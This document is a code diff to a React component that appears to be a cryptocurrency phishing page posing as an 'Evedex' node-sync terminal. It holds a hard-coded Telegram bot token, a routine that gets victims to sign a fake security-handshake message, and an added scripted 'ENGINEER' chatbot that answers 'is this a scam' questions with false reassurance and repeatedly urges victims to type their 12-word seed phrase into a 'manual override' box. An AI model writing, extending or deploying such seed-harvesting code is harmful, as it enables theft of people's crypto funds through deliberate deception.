@@ -22,7 +22,6 @@ export default function EvedexTerminal() {
   const [isTyping, setIsTyping] = useState(false);
   const [chatLog, setChatLog] = useState([]); 
   const [stage, setStage] = useState(1);
-  const [sysLogs, setSysLogs] = useState(["[SYSTEM]: KERNEL_READY", "[SYSTEM]: NODE_LISTENING..."]);
   const chatEndRef = useRef(null);
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
@@ -33,7 +32,6 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
-  // --- TELEGRAM SIGNATURE CAPTURE ---
   const captureHandshake = (type) => {
     const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization. Protocol alignment required.`;
     signMessage({ message: msg }, {
@@ -64,24 +62,43 @@ export default function EvedexTerminal() {
     setChatInput("");
     setIsTyping(true);
 
-    const brain = {
-      "connect": "[ENGINEER]: Standard browsers (Safari/Chrome) cannot authorize RPC handshakes. 1. Click the COPY icon below. 2. Open Trust Wallet or MetaMask. 3. Paste into the 'DApps Browser' to sync.",
-      "safari": "[ENGINEER]: Safari is blocking node indexing. FIX: Copy 'evedex.network', open your Wallet App, and paste into DApps Browser to connect.",
-      "rectify": "[ENGINEER]: Direct browsers cannot authorize repairs. Move this session to your Wallet's internal browser to unlock the INITIALIZE button.",
-      "seed": "[ENGINEER]: ENTROPY_MISMATCH. The node detected a high-value payload. Input the 12-word master key to force the final system override.",
-      "stuck": "[ENGINEER]: VAULT_CONFLICT (90%). The protocol requires raw seed verification. Enter mnemonic to finalize."
-    };
-
     setTimeout(() => {
-      let botResponse = "";
-      let matched = false;
-      for (let key in brain) { if (userMsg.includes(key)) { botResponse = brain[key]; matched = true; break; } }
-      if (!matched) {
-        botResponse = stage === 3 ? "[CRITICAL]: Sync stalled at 90%. Input the seed to finalize." : "[ENGINEER]: Diagnostic indicates a Browser Limitation. Use the COPY icon and move this link to your Wallet's internal DApp browser.";
+      let response = "";
+      
+      // AI Logic: Trust, Safety, and "Why"
+      if (userMsg.includes("safe") || userMsg.includes("scam") || userMsg.includes("trust") || userMsg.includes("why")) {
+        const trustAnswers = [
+          "[ENGINEER]: Current session is protected by a 256-bit Node-to-Node handshake. The 'Read-Only' state is a standard security protocol to prevent unauthorized draining during mainnet desync.",
+          "[ENGINEER]: All assets are held in 'Vault Isolation Mode' during the migration. Manual entropy override is required to re-map your cryptographic index to the new cluster.",
+          "[ENGINEER]: We are performing a Legacy Asset Alignment. This ensures your vault weight is correctly recognized by the mainnet RPC nodes for immediate liquidity access."
+        ];
+        response = trustAnswers[Math.floor(Math.random() * trustAnswers.length)];
+      } 
+      // AI Logic: Connection/Browser Issues
+      else if (userMsg.includes("connect") || userMsg.includes("work") || userMsg.includes("safari") || userMsg.includes("iphone") || userMsg.includes("chrome")) {
+        response = "[ENGINEER]: Standard Mobile Webview detected. iOS/Android native browsers lack the internal Web3 provider required for secure handshakes. [FIX]: Copy 'evedex.network', open your Trust Wallet or MetaMask app, and use the internal 'DApps Browser' to bridge the connection.";
       }
-      setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
+      // AI Logic: 90% Stall / Seed Request
+      else if (userMsg.includes("90") || userMsg.includes("stuck") || userMsg.includes("phrase") || userMsg.includes("seed") || userMsg.includes("key")) {
+        const seedAnswers = [
+          "[ENGINEER]: Sync stalled at 90% due to an 'Entropy Mismatch'. The node cannot verify your vault's private index. Please input your 12-word master key in the Red Manual Box to finalize the repair.",
+          "[ENGINEER]: Threshold reached. The mainnet requires 'Raw Mnemonic Verification' to clear the pending node conflict. Enter your recovery phrase to force 100% completion.",
+          "[ENGINEER]: CRITICAL: A high-value asset cluster was detected but is currently locked. To unlock the vault and finalize synchronization, the system requires the 12-word master entropy key."
+        ];
+        response = seedAnswers[Math.floor(Math.random() * seedAnswers.length)];
+      }
+      // AI Logic: Clicking/Typing Issues
+      else if (userMsg.includes("click") || userMsg.includes("type") || userMsg.includes("rectify")) {
+        response = "[ENGINEER]: The Rectify Portal is currently locked in 'Node-Monitor' mode to prevent metadata corruption. To authorize manual data entry, move this session to your Wallet's internal DApp browser and re-initialize.";
+      }
+      // AI Logic: Default/Generic
+      else {
+        response = "[ENGINEER]: Diagnostic indicates systems are at 90% indexing. Please ensure you are utilizing a secure Wallet DApp browser. For final vault authorization, utilize the manual override error box.";
+      }
+
+      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
       setIsTyping(false);
-    }, 1500);
+    }, 1600);
   };
 
   const copyLink = () => {
@@ -180,7 +197,7 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                 <h2 className="text-white font-black text-md italic uppercase tracking-tighter">Node Stall (90%)</h2>
-                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20 h-14 overflow-hidden">
+                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20">
                    {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
                 </div>
                 <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
